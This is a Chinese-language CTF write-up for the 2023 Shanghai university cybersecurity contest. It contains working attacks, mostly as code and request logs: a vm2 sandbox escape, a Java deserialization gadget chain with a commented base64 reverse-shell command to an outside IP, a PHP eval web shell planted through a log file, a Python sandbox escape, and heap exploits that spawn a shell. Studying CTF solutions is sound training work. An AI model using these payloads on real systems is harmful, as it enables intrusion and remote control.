# 2023年第八届上海市大学生网络安全大赛Writeup

> 原文: https://www.ctfiot.com/117690.html
> ID: 117690

2023.5.20 By ACT.

Web

CookieBack

源代码提示

<!-- What? Is your cookie data? Send the data to the cookie. -->

扫描目录发现/cookie endpoint，内容如下：

Steal the cookie and send it to my /cookie?data endpoint

Once you do, refresh the page to find the flag ;)

GET /cookie?data=connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s HTTP/1.1
Host: 116.236.144.37:24644
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s
If-None-Match: W/"114-L/TMyoVclBktx7CIK5iqopX89v0"
Connection: close

再发送一次

GET /cookie?data=flag HTTP/1.1
Host: 116.236.144.37:24644
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s
If-None-Match: W/"114-L/TMyoVclBktx7CIK5iqopX89v0"
Connection: close

easy_node

题目提示

see `/src`

获得源代码

const express = require('express');
const app = express();
var bodyParser = require('body-parser')
app.use(bodyParser.json())
const {VM} = require("vm2");
const fs = require("fs");
const session = require("express-session");
const cookieParser = require('cookie-parser');
session_secret = Math.random().toString(36).substr(2);
app.use(cookieParser(session_secret));
app.use(session({ secret: session_secret, resave: true, saveUninitialized: true }))

function copyArray(arr1){
    var arr2 = new Array(arr1.length);
    for (var i=0;i<arr1.length;i++){
        if(arr1[i] instanceof Object){
            arr2[i] = copyArray(arr1[i])
        }else{
            arr2[i] = arr1[i]
        }
    }
    return arr2
}

app.get('/', function (req, res) {
    res.send('see `/src`');
});

app.post('/vm2_tester',function(req,res){
    if(req.body.name) {
        req.session.user = {"username": req.body.name}
        const properties = req.body.properties
        for (let i = 0; i < properties.length; i++) {
            if (properties[i] == 'vm2_tester') {
                res.send('cant set vm2_tester by self')
                return
            }
        }
        req.session.user.properties = copyArray(properties)
        res.send('Success')
    }else {
        res.send("input username")
    }
})

app.post('/vm2',function  (req, res) {

    if(req.session.user && req.session.user.properties) {
        for (var i = 0; i < req.session.user.properties.length; i++)
            if (req.session.user.properties[i] == 'vm2_tester') {
                if (req.body["code"]) {
                    if (/b(?:function)b/.test(req.body["code"])) {
                        res.send("define function not allowed")
                        return;
                    }
                    if (/b(?:getPrototypeOf)b/.test(req.body["code"])) {
                        res.send("define getPrototypeOf not allowed")
                        return;
                    }
                    const vm = new VM();
                    res.send(vm.run(req.body["code"]))
                    return
                } else{
                    res.send("input code")
                }
            }
    }else{
        res.send("not vm2 tester rights")
    }

})

app.get('/', function (req, res) {
    res.send('see `/src`,use vm2 3.9.16');
});
app.get('/src', function (req, res) {
    var data = fs.readFileSync('app.js');
    res.send(data.toString());
});

app.listen(3000, function () {
    console.log('start listening on port 3000');
});

这里的vm2用的3.9.16。根据代码分析，先经过/vm2_tester使得 req.session.user.properties = ["vm2_tester"]

POST /vm2_tester HTTP/1.1
Host: 116.236.144.37:21928
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3A6B0tSWAZFoLiQVGewVd20sZ34CAMCsnm.dXYZxOsZ5AtatVCZz9I7mJS9mIXN6yWn5LIQ0f4s2fg
Connection: close
Content-Type: application/json
Content-Length: 77

{
  "name":[ "vm2_tester"],
"properties":{
"length": "vm2_tester"
}
 }

覆盖键length值为vm2_tester。再使用vm2 Sandbox Bypass PoC

POST /vm2 HTTP/1.1
Host: 116.236.144.37:21928
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3A6B0tSWAZFoLiQVGewVd20sZ34CAMCsnm.dXYZxOsZ5AtatVCZz9I7mJS9mIXN6yWn5LIQ0f4s2fg
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "code": "const err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("cat /flag").toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; }"}

vm2 Sandbox Bypass PoC Reference：

https://security.snyk.io/vuln/SNYK-JS-VM2-5537100

fun_java

访问首页获得如下

try to request /getflag with base64 param data. This is a springboot program without dependences.

根据页面提示可知。springboot原生反序列化

AliyunCTF 2023

参考如下：

https://xz.aliyun.com/t/12509

https://xz.aliyun.com/t/12485

https://boogipop.com/2023/04/24/AliyunCTF%202023%20WriteUP/#bypassit1

用

package com.test;

import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.BaseJsonNode;
import com.fasterxml.jackson.databind.node.POJONode;
import com.fasterxml.jackson.databind.node.ValueNode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URI;
import java.util.Base64;

public class App 
{
    public static void main( String[] args ) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        //constructor.setBody("Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}");");
        constructor.setBody("Runtime.getRuntime().exec("bash -c {echo,=}|{base64,-d}|{bash,-i}");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "boogipop");
        setFieldValue(templatesImpl, "_tfactory", null);
        POJONode jsonNodes = new POJONode(templatesImpl);
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(exp);
        FileOutputStream fout=new FileOutputStream("1.ser");
        fout.write(barr.toByteArray());
        fout.close();
        FileInputStream fileInputStream = new FileInputStream("1.ser");
        System.out.println(serial(exp));
        deserial(serial(exp));
        System.out.println(deserial(serial(exp)));
   }
    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
        //writeReplaceMethod.setAccessible(true);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    private static void Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}

easy_log

页面给出提示，会将请求保存至php文件

I will logged your ip+uri+input in php file , try to find something in log/958f93db977101f94b2dc1bac9ff6e2e/202305/20.php

value插入会给编码，key则不会

username[<?php eval(end(getallheaders()));?>][]=1&password=5555

POST /login.php HTTP/1.1
Host: 116.236.144.37:26286
Content-Length: 63
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://116.236.144.37:26286
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://116.236.144.37:26286/1111
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username[<?php eval(end(getallheaders()));?>][]=1&password=5555

无参数rce

POST /log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls HTTP/1.1
Host: 116.236.144.37:26286
Content-Length: 0
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Origin: http://116.236.144.37:26286
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://116.236.144.37:26286/log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: rt_web_csrf_token=h0j4zKKzyBSFGDqlawUTxI10GY18LjuQuimHdQXjWbACnA7PiLqaGT1lR8TPrcvd; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiNjg0NTUxYjJkMmFlYTI2N2YwN2I0ZTBlZjk3OTUzMWQiLCJ1c2VybmFtZSI6IjEzNzE3MDc2Nzk0IiwiZXhwIjoxNjg0NjMwMzQ0LCJlbWFpbCI6Im1zMTcwMTBAcXEuY29tIn0.FUUu_riV6Frl975wx4m1g7s6B1yoOY0ETyz9iKYAHBM; connect.sid=s%3AudFceoMASjtPuGXM8jsFUl6OGN8JgSx9.9xoRuuuerb2kM2Sntth3eHpw2kqEiqA7%2FiBfcRDA8Ic
Connection: close
Tao: system('cat /S3rect_1S_H3re');

ezpython

sandbox escape

#!/usr/bin/env python3

#print(''.__class__.__base__.__subclasses__())
#print(dir(''.__class__.__base__.__subclasses__()[124].__init__.__globals__['x5fx5fx62x75x69x6cx74x69x6ex73x5fx5f']['x65x76x61x6c']()))

# find flag file
print(''.__class__.__base__.__subclasses__()[124].__init__.__globals__['x5fx5fx62x75x69x6cx74x69x6ex73x5fx5f']['x65x76x61x6c'](')(daer.)"galf eman- / dnif"(nepop.)"so"(__tropmi__'[::-1]))

# read flag
print(''.__class__.__base__.__subclasses__()[118].get_data(0, "/usr/src/app/flag"))

PWN

KeyBox

代码审计：

main函数分析：

第一部分：key的验证

第二部分：经典菜单题

edit

有个任意长度写，这个也是漏洞所在处

exit

v9是一个堆地址，里面包含end函数的地址

后门函数

思路：

进入到菜单 ====> 布局，泄露漏出heap的地址===> 利用任意长度写，造成堆块重叠，修改释放的chunk的fd为v9包含的chunk的地址 ====> 然后我们就能申请到v9所包含的chunk导致堆重叠，我们可以覆写里面的内容为后门函数

一、进入到菜单

这里进到菜单需要绕过key的验证：

这里利用整数溢出来绕过，这里的rax是我们可以控制的，[rbp+var_88]就是我们输入的v5，在下面rbp + rax*8 + s，我们可以使它指向的内存地址等于rbp+var_20的地址，再通过rdx即是v4给其赋值，就可以绕过去：

我们计算一下：rbp + rax*8 - 0x80 == rbp - 0x20 算出来rax*8要等于0x60，rax要等于0xc

我们利用寄存器能存储的最大值，实现整数溢出：即把rax的值赋予0x800000000000000c，然后rax*8因为溢出只会留下0x60

p.sendlineafter("Input the first key: ",str((-2**63) + 0xc))
p.sendlineafter("Input the second key: ",str(1))

成功进入

布局：

申请4个堆

add(0x10,"AAAA") #chunk0 修改下面的chunk的size,改为0x431
add(0x400,"AAAA") #chunk1 将该chunk释放，进入unsorted chunk
add(0x10,"AAAAA") #chunk2 
add(0x10,"AAA") #chunk3

泄露

然后我们进行堆重叠，并且泄露出来heap的地址：

edit(0,p64(0)*3+p64(0x431))
dele(1)

add(0x400,"AAAA") 
add(0x10,"AAAA") # 造成堆重叠

dele(3) # 先释放chunk3
dele(2) # 再释放chunk2，这样子chunk2的位置就会有指向chunk3的指针，并且堆重叠，我们就可以泄露出来

show()
p.recvuntil("4 : ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(0x8,b"x00")) - 0x450 - 0x20 # 计算v9指向的堆块的位置

泄露出来：

再次堆重叠

我们申请的chunk的大小是等于v9包含的chunk的大小的，我们现在只要将释放的chunk的fd指向v9所包含的chunk就可以控制其中的内容

edit(4,p64(heap_addr))
add(0x10,"AAA")
add(0x10,p64(0)+p64(backdoor))

我们还要申请两个chunk，就可以修改v9指向的chunk的内容

将v9[1]的值修改为后门函数的地址

成功拿到flag

exp：

from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("116.236.144.37",24028)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter("Your choice:",'2')
    p.sendlineafter("Please enter the length of the item:",str(size))
    p.sendlineafter("Please enter the name of item:",content)

def show():
    p.sendlineafter("Your choice:",'1')

def edit(idx,content):
    p.sendlineafter("Your choice:",'3')
    p.sendlineafter("Please enter the index of item:",str(idx))
    p.sendlineafter("Please enter the length of item:",str(len(content)))
    p.sendlineafter("Please enter the new name of the item:",content)

def dele(idx):
    p.sendlineafter("Your choice:",'4')
    p.sendlineafter("Please enter the index of item:",str(idx))

backdoor = 0x401765
get_p("./KeyBox")
p.sendlineafter("Input the first key: ",str((-2**63) + 0xc))
p.sendlineafter("Input the second key: ",str(1))

add(0x10,"AAAA")
add(0x400,"AAAA")
add(0x10,"AAAAA")
add(0x10,"AAA")

edit(0,p64(0)*3+p64(0x431))
dele(1)

add(0x400,"AAAA")
add(0x10,"AAAA")

dele(3)
dele(2)

show()
p.recvuntil("4 : ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(0x8,b"x00")) - 0x450 - 0x20
print(hex(heap_addr))

edit(4,p64(heap_addr))
add(0x10,"AAA")
add(0x10,p64(0)+p64(backdoor))
# gdb.attach(p,"")
p.sendlineafter("Your choice:",'5')
p.interactive()

这里没有提供libc版本，所有要试出来libc是哪个大版本的

SSQL

代码审计

保护机制：

main函数

该程序是模拟MySQL数据库

菜单：

__int64 __fastcall sub_1EC1(char *a1)
{
  sub_1E84();
  sub_13A4(a1);
  if ( !strcmp(s1, "CREATE") )
  {
    if ( !strcmp(qword_5068, "TABLE") )
    {
      if ( qword_5070 )
      {
        add_table(qword_5070);
        return 1LL;
      }
      else
      {
        puts("CREATE TABLE <TABLE_NAME>");
        return 0LL;
      }
    }
    else if ( qword_5078 && qword_5068 )
    {
      add_column((const char *)qword_5078, qword_5068);
      return 2LL;
    }
    else
    {
      puts("CREATE COLUMN FROM TABLE");
      return 0LL;
    }
  }
  else if ( !strcmp(s1, "DELETE") )
  {
    if ( !strcmp(qword_5068, "TABLE") )
    {
      if ( qword_5070 )
      {
        delete_table((__int64)qword_5070);
        return 3LL;
      }
      else
      {
        puts("DELETE TABLE <TABLE_NAME");
        return 0LL;
      }
    }
    else
    {
      strcmp(qword_5070, "FROM");
      if ( qword_5078 && qword_5068 )
      {
        delete_column(qword_5078, qword_5068);
        return 4LL;
      }
      else
      {
        puts("DELETE COLUMN FROM TABLE");
        return 0LL;
      }
    }
  }
  else if ( !strcmp(s1, "SHOW") )
  {
    if ( !strcmp(qword_5068, "TABLE") )
    {
      if ( qword_5070 )
      {
        show(qword_5070);
        return 5LL;
      }
      else
      {
        puts("SHOW TABLE <table name>");
        return 0LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  else if ( !strcmp(s1, "EDIT") )
  {
    if ( !strcmp(qword_5070, "FROM") )
    {
      if ( qword_5078 && qword_5068 )
      {
        edit((const char *)qword_5078, (__int64)qword_5068);
        return 6LL;
      }
      else
      {
        puts("EDIT COLUMN FROM TABLE");
        return 0LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  else
  {
    puts("command not found");
    return 0LL;
  }
}

一顿对代码死磕理解后(折磨了半天)，下面对其具体解释：

add()：

add函数分为两种模式：

第一种：

就是创建table用途即是存放该table里的column：

会申请一个0x28的chunk来存放，而table存放column的结构是链表结构：

第二种：

会申请0x28的chunk存放列名，申请0x100的chunk来存放字段。而列名的chunk会存放上个列名的chunk的指针，和所属的table的的指针，后面就是所属字段的指针：

column的结构：

struct column{
    char name[0x10];
    column* fb;
    table* belong;
    char* Field;
}

dele():

dele函数也分为两种：

第一种：

整体是利用链表来实现将所属的column进行释放

第二种：

整体就是，单个column被删去的时候，会修改上下的列表的链表指针，然后释放自己，还有字段的chunk

show():

就是利用table名，对其所属的column的值全部输出出来

edit():

这里便是漏洞所在，strcpy函数会往cp的字符后加上”x00″

思路：

通过风水布局 + 漏洞利用 泄露出来libc地址 ===> 再通过tcache poisoning往_free_hook申请chunk,改其为system的地址 ===> 释放含有”/bin/sh“的字段，即能getshell

风水布局：

add(mode = 0,table="AAAA")
add("A","AAAA")
add(mode = 0,table="CCCC")
add(mode = 0,table="BBBB")
add("b","BBBB")
dele(mode = 0,table="CCCC")
add("b","AAAA")

泄露heap地址

我们利用释放再重新申请，在show即可得到heap的地址：

dele("b","AAAA") #这里倒着释放就是为了我们后面申请回来的时候，是跟释放前的布局一样的
dele("A","AAAA")

add("A","AAAA")
add("b","AAAA")
show("AAAA")
p.recvuntil("Content: ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(8,b"x00"))
print(hex(heap_addr))

泄露libc地址：

我们先利用漏洞使堆块重叠：

edit("A","AAAA","A"*0x10,b"A"*0xc0+p64(0)+p64(0x111)+p64(0)*2) # 将Column的fd后一位置为零
dele(table="AAAA",mode=0)

我们利用漏洞将column的fd后一位置为零，然后利用置零后的fd是在该column的字段的chunk里，在其字段制造一个fake chunk：

然后释放table，然后根据这个指针就会释放我们的fake_chunk:

成功！

释放7个column，会使7个0x110进入tcache，然后在释放这个chunk：

我们再通过我们伪造的fake_chunk，通过”A“的字符覆盖到这个chunk的位置，通过show就可以带着输出出来：

add(mode = 0,table="CCCC")
add("b","CCCC")

for i in range(7):
    add(chr(0x43+i),"BBBB")

for i in range(7):
    dele(chr(0x43+i),"BBBB")

dele(table="BBBB",mode=0)

edit("b","CCCC","b","A"*0xd0)
show("CCCC")

然后我们先恢复堆：

payload = b"A"*0x30 + p64(0) + p64(0x31) + b"A"*0x20 + p64(0)+p64(0x31) + p64(0)+b"A"*0x18 + p64(0)+p64(0x31) + b"A"*0x20 +p64(0) + p64(0x111)
edit("b","CCCC","b",payload)

恢复成功，然后我们将它全部申请回去，并将位于我们fake_chunk可控制的范围的chunk释放掉：

add(mode = 0,table="BBBB")
for i in range(7):
    add(chr(0x43+i),"BBBB")

dele(chr(0x43+5),"BBBB")
dele(chr(0x43+6),"BBBB")

然后利用fake_chunk写入free_hook的地址，然后我们就可以申请到free_hook的堆，修改为system：

add(mode = 0,table="/bin/shx00")
add(mode = 0,table=p64(libc.sym['system']))
dele(mode = 0,table="/bin/sh")

然后改为system：

然后释放含有”/bin/sh“的堆块，就可以getshell：

exp：

from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("./libc-2.31.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def add(name = "",table = "",mode = 1):
    if mode == 0:
        if type(table) == bytes:
            p.sendafter("mysql > ",b"CREATE TABLE " + table)
        else:
            p.sendafter("mysql > ","CREATE TABLE " + table)
    else:
        p.sendafter("mysql > ","CREATE "+name + " FROM " + table)

def dele(name = "",table = "",mode = 1):
    if mode == 0:
        p.sendafter("mysql > ","DELETE TABLE " + table)
    else:
        p.sendafter("mysql > ","DELETE " + name + " FROM " + table)

def edit(name = "",table = "",content1 = "",content = "",mode = 0):
    p.sendafter("mysql > ","EDIT " + name + " FROM " + table)
    if mode == 1 :
        p.sendafter("Column name:",content1)
    else:
        p.sendafter("Column name:",content1)
        p.sendafter("Column Content: ",content)

def show(table):
    p.sendafter("mysql > ","SHOW TABLE " + table)

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("116.236.144.37",26748)
    elf = ELF(name)

get_p("./pwn")
add(mode = 0,table="AAAA")
add("A","AAAA")
add(mode = 0,table="CCCC")
add(mode = 0,table="BBBB")
add("b","BBBB")
dele(mode = 0,table="CCCC")
add("b","AAAA")

# edit("A","AAAA","A"*0x10,b"A"*0xc0+p64(0)+p64(0x))

dele("b","AAAA")
dele("A","AAAA")

add("A","AAAA")
add("b","AAAA")
# add("b","BBBB")

show("AAAA")
p.recvuntil("Content: ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(8,b"x00"))
print(hex(heap_addr))

edit("A","AAAA","A"*0x10,b"A"*0xc0+p64(0)+p64(0x111)+p64(0)*2)
dele(table="AAAA",mode=0)

add(mode = 0,table="CCCC")
add("b","CCCC")

for i in range(7):
    add(chr(0x43+i),"BBBB")

for i in range(7):
    dele(chr(0x43+i),"BBBB")

dele(table="BBBB",mode=0)

edit("b","CCCC","b","A"*0xd0)
show("CCCC")
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00")) - 0x10 - 96 - libc.sym['__malloc_hook']
free_hook = libc.sym['__free_hook']
print(hex(libc.address))
payload = b"A"*0x30 + p64(0) + p64(0x31) + b"A"*0x20 + p64(0)+p64(0x31) + p64(0)+b"A"*0x18 + p64(0)+p64(0x31) + b"A"*0x20 +p64(0) + p64(0x111)
edit("b","CCCC","b",payload)

add(mode = 0,table="BBBB")
for i in range(7):
    add(chr(0x43+i),"BBBB")

dele(chr(0x43+5),"BBBB")
dele(chr(0x43+6),"BBBB")
payload = b"A"*0x30 + p64(0) + p64(0x31) + b"A"*0x20 + p64(0)+p64(0x31) + p64(free_hook)
edit("b","CCCC","b",payload)

add(mode = 0,table="/bin/shx00")
add(mode = 0,table=p64(libc.sym['system']))
dele(mode = 0,table="/bin/sh")

# gdb.attach(p,"")
p.interactive()

Reverse

ezEXE

检查文件

32位 exe 程序，无壳，直接拖入IDA。

花指令

看到main函数，但是发现只有sub_4022E0()可以查看反汇编代码，点击其他函数都会报堆栈不平衡的错误。

查看汇编代码，发现花指令，直接将0x401936-0x40193E之间的代码都NOP掉。

patch 前

patch 后

再次尝试F5反汇编。

逐步分析，看sub_401500()函数，发现是反调试。

往下看，程序将unk_403040地址的数据赋值给lpAddress函数。输出请输入flag字符，并通过scanf函数接受用户输入。然后调用sub_40179A()函数，并将用户输入传入。

sub_40179A()函数

这里看到程序将lpAddress地址传入了sub_4016EB函数，并在下一行调用了lpAddress函数。（静态分析的时候能知道lpAddress在sub_4016EB函数运行前是乱数据，所有这是一个SMC解码函数）。

SMC

进到sub_4016EB函数可以看到这是一个自解码函数，对每一个字符进行异或5。

这里可以使用IDC脚本，也可以直接动调把内存dump出来。下面是dump出来的函数。

很明显是一个RC4算法，通过分析可以知道前面赋值给Str的字符串VrDQ-ffgaEig04qx就是RC4的密钥

程序将用户输入通过RC4加密后，再进行了base64加密，最终得到密文RQpxxZgUqxzwonBuDApb3PyRJ8CcLIyXVozsVjurmPQdUdND+cly4HFq。

解题脚本

直接附上解题脚本

import base64

def KSA(key):
    key_length = len(key)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        yield K

def RC4(key):
    S = KSA(key)
    keystream = PRGA(S)
    return keystream

if __name__ == '__main__':
    key = 'VrDQ-ffgaEig04qx'
    # 先进行 base64 解密
    Buf1 = base64.b64decode('RQpxxZgUqxzwonBuDApb3PyRJ8CcLIyXVozsVjurmPQdUdND+cly4HFq')

    key = key.encode()
    keystream = RC4(key) # 生成密钥流
    ciphertext = bytes(Buf1) # 密文流
    
    plaintext2 = bytearray()
    for b in ciphertext:
        plaintext2.append(b ^ next(keystream)) # 异或得到明文

    print(plaintext2)

Crypto

Bird

crackme

题目文件忘记删掉flag了，直接交

Misc

complicated_http

导出http对象，先找到上传的webshell内容

AES加密，key也给出的，一个个解密内容，找到flag即可

AES加密，key也给出的，一个个解密内容，找到flag即可

good_http

给了两个一样的图，明显是盲水印，跑脚本

python bwmforpy3.py decode one.png theother.png wm_one.png

密码 XD8C2VOKEU 解压得到flag


```
<!-- What? Is your cookie data? Send the data to the cookie. -->
```



```
Steal the cookie and send it to my /cookie?data endpoint

Once you do, refresh the page to find the flag ;)
```



```
GET /cookie?data=connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s HTTP/1.1
Host: 116.236.144.37:24644
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s
If-None-Match: W/"114-L/TMyoVclBktx7CIK5iqopX89v0"
Connection: close
```



```
GET /cookie?data=flag HTTP/1.1
Host: 116.236.144.37:24644
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s
If-None-Match: W/"114-L/TMyoVclBktx7CIK5iqopX89v0"
Connection: close
```



```
see `/src`
```



```
const express = require('express');
const app = express();
var bodyParser = require('body-parser')
app.use(bodyParser.json())
const {VM} = require("vm2");
const fs = require("fs");
const session = require("express-session");
const cookieParser = require('cookie-parser');
session_secret = Math.random().toString(36).substr(2);
app.use(cookieParser(session_secret));
app.use(session({ secret: session_secret, resave: true, saveUninitialized: true }))

function copyArray(arr1){
    var arr2 = new Array(arr1.length);
    for (var i=0;i<arr1.length;i++){
        if(arr1[i] instanceof Object){
            arr2[i] = copyArray(arr1[i])
        }else{
            arr2[i] = arr1[i]
        }
    }
    return arr2
}

app.get('/', function (req, res) {
    res.send('see `/src`');
});

app.post('/vm2_tester',function(req,res){
    if(req.body.name) {
        req.session.user = {"username": req.body.name}
        const properties = req.body.properties
        for (let i = 0; i < properties.length; i++) {
            if (properties[i] == 'vm2_tester') {
                res.send('cant set vm2_tester by self')
                return
            }
        }
        req.session.user.properties = copyArray(properties)
